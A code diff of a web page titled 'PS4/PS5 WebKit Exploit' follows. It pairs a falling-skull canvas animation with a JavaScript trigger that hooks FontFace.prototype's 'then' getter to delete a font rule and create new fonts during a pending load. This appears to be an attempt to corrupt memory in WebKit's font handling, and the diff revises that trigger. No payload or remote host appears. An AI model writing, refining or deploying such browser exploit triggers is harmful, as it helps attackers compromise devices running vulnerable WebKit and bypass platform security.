@@ -3,18 +3,14 @@
 <head>
     <meta charset="utf-8">
     <title>PS4/PS5 WebKit Exploit</title>
-    <style id="style">
-        @font-face {
-            font-family: "test";
-            src: url("nonexistent.woff2");
-            unicode-range: U+0041-005A;
-        }
+    <style id="s">
+        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
     </style>
     <style>
-        body { margin:0; background:#000; color:#00ff00; font-family:'Courier New'; overflow:hidden; height:100vh; }
-        canvas { position:absolute; top:0; left:0; z-index:1; opacity:0.22; }
+        body { margin:0; background:#000; color:#00ff00; font-family:'Courier New', monospace; overflow:hidden; height:100vh; }
+        canvas { position:absolute; top:0; left:0; z-index:1; opacity:0.20; }
         .content { position:relative; z-index:2; text-align:center; padding-top:80px; }
-        h1 { color:#00ff41; font-size:32px; text-shadow:0 0 20px #00ff41; }
+        h1 { color:#00ff41; font-size:30px; text-shadow:0 0 15px #00ff41; }
     </style>
 </head>
 <body>
@@ -28,52 +24,55 @@
     </div>
 
     <script>
-        // === CALAVERAS PIRATAS ===
+        // === CALAVERAS CAYENDO ===
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.height = window.innerHeight;
         canvas.width = window.innerWidth;
 
-        const skulls = ['💀','☠️','🦴','⚰️'];
-        const fontSize = 26;
+        const skulls = ['💀','☠️','🦴','⚰️','☠️'];
+        const fontSize = 28;
         const columns = canvas.width / fontSize;
         const drops = Array(Math.floor(columns)).fill(1);
 
         function draw() {
-            ctx.fillStyle = 'rgba(0,0,0,0.08)';
+            ctx.fillStyle = 'rgba(0,0,0,0.07)';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.fillStyle = '#00ff41';
             ctx.font = fontSize + 'px sans-serif';
 
             for (let i = 0; i < drops.length; i++) {
-                const text = skulls[Math.floor(Math.random()*skulls.length)];
+                const text = skulls[Math.floor(Math.random() * skulls.length)];
                 ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.96) drops[i] = 0;
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.965) drops[i] = 0;
                 drops[i]++;
             }
         }
-        setInterval(draw, 40);
+        setInterval(draw, 35);
 
         // === EXPLOIT ORIGINAL (más fuerte) ===
-        let triggered = false;
+        let fired = false;
 
         Object.defineProperty(FontFace.prototype, 'then', {
+            configurable: true,
             get() {
-                if (!triggered) {
-                    triggered = true;
-                    document.getElementById('style').sheet.deleteRule(0);
-                    for (let i = 0; i < 15; i++) {
-                        new FontFace('x' + i, 'local(Arial)', { unicodeRange: 'U+0041-005A' });
-                    }
+                if (!fired && this === A) {
+                    fired = true;
+                    new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                    new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                    document.getElementById('s').sheet.deleteRule(0);
+                    document.body.offsetTop;
                 }
                 return undefined;
             }
         });
 
+        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+        document.fonts.add(A);
+        void A.loaded;
+
         window.onload = () => {
-            const ff = new FontFace('test', 'local(Arial)', { unicodeRange: 'U+0041-005A' });
-            document.fonts.add(ff);
-            document.fonts.load('1em test', 'ABC').catch(() => {});
+            document.fonts.load('1em x', 'AB');
         };
 
         window.addEventListener('resize', () => {
